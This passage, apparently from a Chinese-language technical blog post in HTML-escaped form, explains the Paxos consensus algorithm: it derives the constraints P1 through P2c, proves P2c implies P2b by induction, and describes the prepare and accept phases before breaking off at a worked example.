4;&#x201C;&#x591A;&#x6570;&#x6D3E;&#x201D;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x7684;acceptor&#xFF0C;&#x5982;&#x679C;&#x6BCF;&#x4E2A;acceptor&#x53EA;&#x80FD;&#x63A5;&#x53D7;&#x4E00;&#x4E2A;value&#xFF0C;&#x7EA6;&#x675F;2&#x5C31;&#x80FD;&#x4FDD;&#x8BC1;&#x3002;</p>\n<p>&#x4E8E;&#x662F;&#x4EA7;&#x751F;&#x4E86;&#x4E00;&#x4E2A;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x65B0;&#x7EA6;&#x675F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P1&#xFF1A;&#x4E00;&#x4E2A;acceptor&#x5FC5;&#x987B;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7B2C;&#x4E00;&#x6B21;&#x6536;&#x5230;&#x7684;&#x63D0;&#x6848;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x6CE8;&#x610F;P1&#x662F;&#x4E0D;&#x5B8C;&#x5907;&#x7684;&#x3002;&#x5982;&#x679C;&#x6070;&#x597D;&#x4E00;&#x534A;acceptor&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x5177;&#x6709;value A&#xFF0C;&#x53E6;&#x4E00;&#x534A;&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x5177;&#x6709;value B&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x65E0;&#x6CD5;&#x5F62;&#x6210;&#x591A;&#x6570;&#x6D3E;&#xFF0C;&#x65E0;&#x6CD5;&#x6279;&#x51C6;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;value&#x3002;</p>\n<p>&#x7EA6;&#x675F;2&#x5E76;&#x4E0D;&#x8981;&#x6C42;&#x53EA;&#x6279;&#x51C6;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF0C;&#x6697;&#x793A;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x63D0;&#x6848;&#x3002;&#x53EA;&#x8981;&#x63D0;&#x6848;&#x7684;value&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x6279;&#x51C6;&#x591A;&#x4E2A;&#x63D0;&#x6848;&#x4E0D;&#x8FDD;&#x80CC;&#x7EA6;&#x675F;2&#x3002;&#x4E8E;&#x662F;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x7EA6;&#x675F;P2&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P2&#xFF1A;&#x4E00;&#x65E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x4E4B;&#x540E;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#x7684;&#x63D0;&#x6848;&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#x3002;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>&#x6CE8;&#xFF1A;&#x901A;&#x8FC7;&#x67D0;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x4E3A;&#x6BCF;&#x4E2A;&#x63D0;&#x6848;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#xFF0C;&#x5728;&#x63D0;&#x6848;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x5168;&#x5E8F;&#x5173;&#x7CFB;&#xFF0C;&#x6240;&#x8C13;&#x201C;&#x4E4B;&#x540E;&#x201D;&#x90FD;&#x662F;&#x6307;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#x3002;</p>\n</blockquote>\n<p>&#x5982;&#x679C;P1&#x548C;P2&#x90FD;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#xFF0C;&#x90A3;&#x4E48;&#x7EA6;&#x675F;2&#x5C31;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#x3002;</p>\n<p>&#x6279;&#x51C6;&#x4E00;&#x4E2A;value&#x610F;&#x5473;&#x7740;&#x591A;&#x4E2A;acceptor&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x4E86;&#x8BE5;value.&#x56E0;&#x6B64;&#xFF0C;&#x53EF;&#x4EE5;&#x5BF9;P2&#x8FDB;&#x884C;&#x52A0;&#x5F3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P2a&#xFF1A;&#x4E00;&#x65E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x4E4B;&#x540E;&#x4EFB;&#x4F55;acceptor&#x518D;&#x6B21;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7684;&#x63D0;&#x6848;&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x7531;&#x4E8E;&#x901A;&#x4FE1;&#x662F;&#x5F02;&#x6B65;&#x7684;&#xFF0C;P2a&#x548C;P1&#x4F1A;&#x53D1;&#x751F;&#x51B2;&#x7A81;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;value&#x88AB;&#x6279;&#x51C6;&#x540E;&#xFF0C;&#x4E00;&#x4E2A;proposer&#x548C;&#x4E00;&#x4E2A;acceptor&#x4ECE;&#x4F11;&#x7720;&#x4E2D;&#x82CF;&#x9192;&#xFF0C;&#x524D;&#x8005;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x5177;&#x6709;&#x65B0;&#x7684;value&#x7684;&#x63D0;&#x6848;&#x3002;&#x6839;&#x636E;P1&#xFF0C;&#x540E;&#x8005;&#x5E94;&#x5F53;&#x63A5;&#x53D7;&#xFF0C;&#x6839;&#x636E;P2a&#xFF0C;&#x5219;&#x4E0D;&#x5E94;&#x5F53;&#x63A5;&#x53D7;&#xFF0C;&#x8FD9;&#x4E2D;&#x573A;&#x666F;&#x4E0B;P2a&#x548C;P1&#x6709;&#x77DB;&#x76FE;&#x3002;&#x4E8E;&#x662F;&#x9700;&#x8981;&#x6362;&#x4E2A;&#x601D;&#x8DEF;&#xFF0C;&#x8F6C;&#x800C;&#x5BF9;proposer&#x7684;&#x884C;&#x4E3A;&#x8FDB;&#x884C;&#x7EA6;&#x675F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P2b&#xFF1A;&#x4E00;&#x65E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x4EE5;&#x540E;&#x4EFB;&#x4F55;proposer&#x63D0;&#x51FA;&#x7684;&#x63D0;&#x6848;&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x7531;&#x4E8E;acceptor&#x80FD;&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x90FD;&#x5FC5;&#x987B;&#x7531;proposer&#x63D0;&#x51FA;&#xFF0C;&#x6240;&#x4EE5;P2b&#x8574;&#x6DB5;&#x4E86;P2a&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x66F4;&#x5F3A;&#x7684;&#x7EA6;&#x675F;&#x3002;<br>&#x4F46;&#x662F;&#x6839;&#x636E;P2b&#x96BE;&#x4EE5;&#x63D0;&#x51FA;&#x5B9E;&#x73B0;&#x624B;&#x6BB5;&#x3002;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x8FDB;&#x4E00;&#x6B65;&#x52A0;&#x5F3A;P2b&#x3002;</p>\n<p>&#x5047;&#x8BBE;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x4E3A;m&#x7684;value v&#x5DF2;&#x7ECF;&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x6765;&#x770B;&#x770B;&#x5728;&#x4EC0;&#x4E48;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4EFB;&#x4F55;&#x7F16;&#x53F7;&#x4E3A;n&#xFF08;n&gt;m&#xFF09;&#x7684;&#x63D0;&#x6848;&#x90FD;&#x542B;&#x6709;value v&#x3002;&#x56E0;&#x4E3A;m&#x5DF2;&#x7ECF;&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x663E;&#x7136;&#x5B58;&#x5728;&#x4E00;&#x4E2A;acceptors&#x7684;&#x591A;&#x6570;&#x6D3E;C&#xFF0C;&#x4ED6;&#x4EEC;&#x90FD;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x4E86;v&#x3002;&#x8003;&#x8651;&#x5230;&#x4EFB;&#x4F55;&#x591A;&#x6570;&#x6D3E;&#x90FD;&#x548C;C&#x5177;&#x6709;&#x81F3;&#x5C11;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x6210;&#x5458;&#xFF0C;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x8574;&#x6DB5;P2b&#x7684;&#x7EA6;&#x675F;P2c&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P2c&#xFF1A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x4E3A;n&#x7684;&#x63D0;&#x6848;&#x5177;&#x6709;value v&#xFF0C;&#x90A3;&#x4E48;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x4E2D;&#x6240;&#x6709;&#x4EBA;&#x90FD;&#x6CA1;&#x6709;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n </span><br><span class=\"line\">&#x7684;&#x4EFB;&#x4F55;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x5177;&#x6709;value v&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x53EF;&#x4EE5;&#x7528;&#x6570;&#x5B66;&#x5F52;&#x7EB3;&#x6CD5;&#x8BC1;&#x660E;P2c&#x8574;&#x6DB5;P2b&#xFF1A;</strong><br>&#x5047;&#x8BBE;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;m&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF0C;&#x5F53;n=m+1&#x65F6;&#xFF0C;&#x91C7;&#x7528;&#x53CD;&#x8BC1;&#x6CD5;&#xFF0C;&#x5047;&#x5982;&#x63D0;&#x6848;n&#x4E0D;&#x5177;&#x6709;value v&#xFF0C;&#x800C;&#x662F;&#x5177;&#x6709;value w&#xFF0C;&#x6839;&#x636E;P2c&#xFF0C;&#x5219;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;S1&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x4E2D;&#x6CA1;&#x6709;&#x4EBA;&#x63A5;&#x53D7;&#x8FC7;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x4EFB;&#x4F55;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x662F;value w&#x3002;&#x7531;&#x4E8E;S1&#x548C;&#x901A;&#x8FC7;&#x63D0;&#x6848;m&#x65F6;&#x7684;&#x591A;&#x6570;&#x6D3E;C&#x4E4B;&#x95F4;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x7684;acceptor&#xFF0C;&#x6240;&#x4EE5;&#x4EE5;&#x4E0A;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x90FD;&#x4E0D;&#x6210;&#x7ACB;&#xFF0C;&#x5BFC;&#x51FA;&#x77DB;&#x76FE;&#x4ECE;&#x800C;&#x63A8;&#x7FFB;&#x5047;&#x8BBE;&#xFF0C;&#x8BC1;&#x660E;&#x4E86;&#x63D0;&#x6848;n&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#xFF1B;</p>\n<p>&#x82E5;&#xFF08;m+1&#xFF09;..&#xFF08;N-1&#xFF09;&#x6240;&#x6709;&#x63D0;&#x6848;&#x90FD;&#x5177;&#x6709;value v&#xFF0C;&#x91C7;&#x7528;&#x53CD;&#x8BC1;&#x6CD5;&#xFF0C;&#x5047;&#x5982;&#x65B0;&#x63D0;&#x6848;N&#x4E0D;&#x5177;&#x6709;value v&#xFF0C;&#x800C;&#x662F;&#x5177;&#x6709;value w&#x2019;,&#x6839;&#x636E;P2c&#xFF0C;&#x5219;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;S2&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x6CA1;&#x6709;&#x63A5;&#x53D7;&#x8FC7;m..&#xFF08;N-1&#xFF09;&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;N&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x662F;value w&#x2019;&#x3002;&#x7531;&#x4E8E;S2&#x548C;&#x901A;&#x8FC7;m&#x7684;&#x591A;&#x6570;&#x6D3E;C&#x4E4B;&#x95F4;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x7684;acceptor&#xFF0C;&#x6240;&#x4EE5;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;acceptor&#x66FE;&#x7ECF;&#x63A5;&#x53D7;&#x4E86;m&#xFF0C;&#x4ECE;&#x800C;&#x4E5F;&#x53EF;&#x4EE5;&#x63A8;&#x51FA;S2&#x4E2D;&#x5DF2;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x7684;&#x7F16;&#x53F7;&#x8303;&#x56F4;&#x5728;m..&#xFF08;N-1&#xFF09;&#x4E4B;&#x95F4;&#xFF0C;&#x800C;&#x6839;&#x636E;&#x521D;&#x59CB;&#x5047;&#x8BBE;&#xFF0C;m..&#xFF08;N-1&#xFF09;&#x4E4B;&#x95F4;&#x7684;&#x6240;&#x6709;&#x63D0;&#x6848;&#x90FD;&#x5177;&#x6709;value v&#xFF0C;&#x6240;&#x4EE5;S2&#x4E2D;&#x5DF2;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x80AF;&#x5B9A;&#x5177;&#x6709;value v&#xFF0C;&#x5BFC;&#x51FA;&#x77DB;&#x76FE;&#x4ECE;&#x800C;&#x63A8;&#x7FFB;&#x65B0;&#x63D0;&#x6848;n&#x4E0D;&#x5177;&#x6709;value v&#x7684;&#x5047;&#x8BBE;&#x3002;&#x6839;&#x636E;&#x6570;&#x5B66;&#x5F52;&#x7EB3;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x8BC1;&#x660E;&#x4E86;&#x82E5;&#x6EE1;&#x8DB3;P2c&#xFF0C;&#x5219;P2b&#x4E00;&#x5B9A;&#x6EE1;&#x8DB3;&#x3002;</p>\n<p>P2c&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x6A21;&#x578B;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5F15;&#x5165;&#x4E86;P2c&#x540E;&#xFF0C;&#x4E5F;&#x89E3;&#x51B3;&#x4E86;&#x524D;&#x6587;&#x63D0;&#x5230;&#x7684;P1&#x4E0D;&#x5B8C;&#x5907;&#x7684;&#x95EE;&#x9898;&#x3002;</p>\n<h3 id=\"&#x7B97;&#x6CD5;&#x7684;&#x5185;&#x5BB9;\"><a href=\"#&#x7B97;&#x6CD5;&#x7684;&#x5185;&#x5BB9;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x7684;&#x5185;&#x5BB9;\"></a>&#x7B97;&#x6CD5;&#x7684;&#x5185;&#x5BB9;</h3><p>&#x8981;&#x6EE1;&#x8DB3;P2c&#x7684;&#x7EA6;&#x675F;&#xFF0C;proposer&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#x524D;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x548C;&#x8DB3;&#x4EE5;&#x5F62;&#x6210;&#x591A;&#x6570;&#x6D3E;&#x7684;acceptors&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#xFF0C;&#x83B7;&#x5F97;&#x4ED6;&#x4EEC;&#x8FDB;&#x884C;&#x7684;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7684;&#x63D0;&#x6848;&#xFF08;prepare&#x8FC7;&#x7A0B;&#xFF09;&#xFF0C;&#x4E4B;&#x540E;&#x6839;&#x636E;&#x56DE;&#x6536;&#x7684;&#x4FE1;&#x606F;&#x51B3;&#x5B9A;&#x8FD9;&#x6B21;&#x63D0;&#x6848;&#x7684;value&#xFF0C;&#x5F62;&#x6210;&#x63D0;&#x6848;&#x5F00;&#x59CB;&#x6295;&#x7968;&#x3002;&#x5F53;&#x83B7;&#x5F97;&#x591A;&#x6570;acceptors&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x540E;&#xFF0C;&#x63D0;&#x6848;&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x7531;proposer&#x5C06;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x544A;&#x77E5;learner&#x3002;&#x8FD9;&#x4E2A;&#x7B80;&#x7565;&#x7684;&#x8FC7;&#x7A0B;&#x7ECF;&#x8FC7;&#x8FDB;&#x4E00;&#x6B65;&#x7EC6;&#x5316;&#x540E;&#x5C31;&#x5F62;&#x6210;&#x4E86;Paxos&#x7B97;&#x6CD5;&#x3002;</p>\n<p>&#x5728;&#x4E00;&#x4E2A;paxos&#x5B9E;&#x4F8B;&#x4E2D;&#xFF0C;&#x6BCF;&#x4E2A;&#x63D0;&#x6848;&#x9700;&#x8981;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x7F16;&#x53F7;&#xFF0C;&#x4E14;&#x7F16;&#x53F7;&#x95F4;&#x8981;&#x5B58;&#x5728;&#x5168;&#x5E8F;&#x5173;&#x7CFB;&#x3002;&#x53EF;&#x4EE5;&#x7528;&#x591A;&#x79CD;&#x65B9;&#x6CD5;&#x5B9E;&#x73B0;&#x8FD9;&#x4E00;&#x70B9;&#xFF0C;&#x4F8B;&#x5982;&#x5C06;&#x5E8F;&#x6570;&#x548C;proposer&#x7684;&#x540D;&#x5B57;&#x62FC;&#x63A5;&#x8D77;&#x6765;&#x3002;&#x5982;&#x4F55;&#x505A;&#x5230;&#x8FD9;&#x4E00;&#x70B9;&#x4E0D;&#x5728;Paxos&#x7B97;&#x6CD5;&#x8BA8;&#x8BBA;&#x7684;&#x8303;&#x56F4;&#x4E4B;&#x5185;&#x3002;</p>\n<p>&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;chosen&#x8FC7;&#x4EFB;&#x4F55;proposer&#x63D0;&#x6848;&#x7684;acceptor&#x5728;prepare&#x8FC7;&#x7A0B;&#x4E2D;&#x56DE;&#x7B54;&#x4E86;&#x4E00;&#x4E2A;proposer&#x9488;&#x5BF9;&#x63D0;&#x6848;n&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5F00;&#x59CB;&#x5BF9;n&#x8FDB;&#x884C;&#x6295;&#x7968;&#x524D;&#xFF0C;&#x53C8;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x4E86;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF08;&#x4F8B;&#x5982;n-1&#xFF09;&#xFF0C;&#x5982;&#x679C;n-1&#x548C;n&#x5177;&#x6709;&#x4E0D;&#x540C;&#x7684;value&#xFF0C;&#x8FD9;&#x4E2A;&#x6295;&#x7968;&#x5C31;&#x4F1A;&#x8FDD;&#x80CC;P2c&#x3002;&#x56E0;&#x6B64;&#x5728;prepare&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;acceptor&#x8FDB;&#x884C;&#x7684;&#x56DE;&#x7B54;&#x540C;&#x65F6;&#x4E5F;&#x5E94;&#x5305;&#x542B;&#x627F;&#x8BFA;&#xFF1A;&#x4E0D;&#x4F1A;&#x518D;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x3002;&#x8FD9;&#x662F;&#x5BF9;P1&#x7684;&#x52A0;&#x5F3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P1a&#xFF1A;&#x5F53;&#x4E14;&#x4EC5;&#x5F53;acceptor&#x6CA1;&#x6709;&#x56DE;&#x5E94;&#x8FC7;&#x7F16;&#x53F7;&#x5927;&#x4E8E;n&#x7684;prepare&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;acceptor&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7F16;&#x53F7;&#x4E3A;n&#x7684;&#x63D0;&#x6848;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x63D0;&#x51FA;&#x5B8C;&#x6574;&#x7684;&#x7B97;&#x6CD5;&#x4E86;&#x3002;</p>\n<h4 id=\"&#x51B3;&#x8BAE;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x6279;&#x51C6;\"><a href=\"#&#x51B3;&#x8BAE;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x6279;&#x51C6;\" class=\"headerlink\" title=\"&#x51B3;&#x8BAE;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x6279;&#x51C6;\"></a>&#x51B3;&#x8BAE;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x6279;&#x51C6;</h4><p>&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x51B3;&#x8BAE;&#x5206;&#x4E3A;&#x4E24;&#x4E2A;&#x9636;&#x6BB5;&#xFF1A;</p>\n<ul>\n<li>prepare&#x9636;&#x6BB5;&#xFF1A;<ul>\n<li>proposer&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#x7F16;&#x53F7;n&#x5E76;&#x5C06;prepare&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x7ED9;acceptors&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;&#xFF1B;</li>\n<li>acceptor&#x6536;&#x5230;prepare&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x63D0;&#x6848;&#x7684;&#x7F16;&#x53F7;&#x5927;&#x4E8E;&#x5B83;&#x5DF2;&#x7ECF;&#x56DE;&#x590D;&#x7684;&#x6240;&#x6709;prepare&#x6D88;&#x606F;&#xFF0C;&#x5219;acceptor&#x5C06;&#x81EA;&#x5DF1;&#x4E0A;&#x6B21;&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x56DE;&#x590D;&#x7ED9;proposer&#xFF0C;&#x5E76;&#x627F;&#x8BFA;&#x4E0D;&#x518D;&#x56DE;&#x590D;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#xFF1B;</li>\n</ul>\n</li>\n<li>&#x6279;&#x51C6;&#x9636;&#x6BB5;&#xFF1A;<ul>\n<li>&#x5F53;&#x4E00;&#x4E2A;proposer&#x6536;&#x5230;&#x4E86;&#x591A;&#x6570;acceptors&#x5BF9;prepare&#x7684;&#x56DE;&#x590D;&#x540E;&#xFF0C;&#x5C31;&#x8FDB;&#x5165;&#x6279;&#x51C6;&#x9636;&#x6BB5;&#x3002;&#x5B83;&#x8981;&#x5411;&#x56DE;&#x590D;prepare&#x8BF7;&#x6C42;&#x7684;acceptors&#x53D1;&#x9001;accept&#x8BF7;&#x6C42;&#xFF0C;&#x5305;&#x62EC;&#x7F16;&#x53F7;n&#x548C;&#x6839;&#x636E;P2c&#x51B3;&#x5B9A;&#x7684;value&#xFF08;&#x5982;&#x679C;&#x6839;&#x636E;P2c&#x6CA1;&#x6709;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#x7684;value&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x53EF;&#x4EE5;&#x81EA;&#x7531;&#x51B3;&#x5B9A;value&#xFF09;&#x3002;</li>\n<li>&#x5728;&#x4E0D;&#x8FDD;&#x80CC;&#x81EA;&#x5DF1;&#x5411;&#x5176;&#x4ED6;proposer&#x7684;&#x627F;&#x8BFA;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;acceptor&#x6536;&#x5230;accept&#x8BF7;&#x6C42;&#x540E;&#x5373;&#x63A5;&#x53D7;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x3002;</li>\n</ul>\n</li>\n</ul>\n<p>&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x5728;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x4E2D;&#x65AD;&#x90FD;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x6B63;&#x786E;&#x6027;&#x3002;&#x4F8B;&#x5982;&#x5982;&#x679C;&#x4E00;&#x4E2A;proposer&#x53D1;&#x73B0;&#x5DF2;&#x7ECF;&#x6709;&#x5176;&#x4ED6;proposers&#x63D0;&#x51FA;&#x4E86;&#x7F16;&#x53F7;&#x66F4;&#x9AD8;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x5219;&#x6709;&#x5FC5;&#x8981;&#x4E2D;&#x65AD;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x3002;&#x56E0;&#x6B64;&#x4E3A;&#x4E86;&#x4F18;&#x5316;&#xFF0C;&#x5728;&#x4E0A;&#x8FF0;prepare&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;acceptor&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x66F4;&#x9AD8;&#x7F16;&#x53F7;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x901A;&#x77E5;proposer&#xFF0C;&#x63D0;&#x9192;&#x5176;&#x4E2D;&#x65AD;&#x8FD9;&#x6B21;&#x63D0;&#x6848;&#x3002;</p>\n<h4 id=\"&#x5B9E;&#x4F8B;\"><a href=\"#&#x5B9E;&#x4F8B;\" class=\"headerlink\" title=\"&#x5B9E;&#x4F8B;\"></a>&#x5B9E;&#x4F8B;</h4><p>&#x7528;&#x5B9E;&#x9645;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x66F4;&#x6E05;&#x6670;&#x5730;&#x63CF;&#x8FF0;&#x4E0A;&#x8FF0;&#x8FC7;&#x7A0B;&#xFF1A;<br>&#x6709;A1, A2, A3, A4, A5 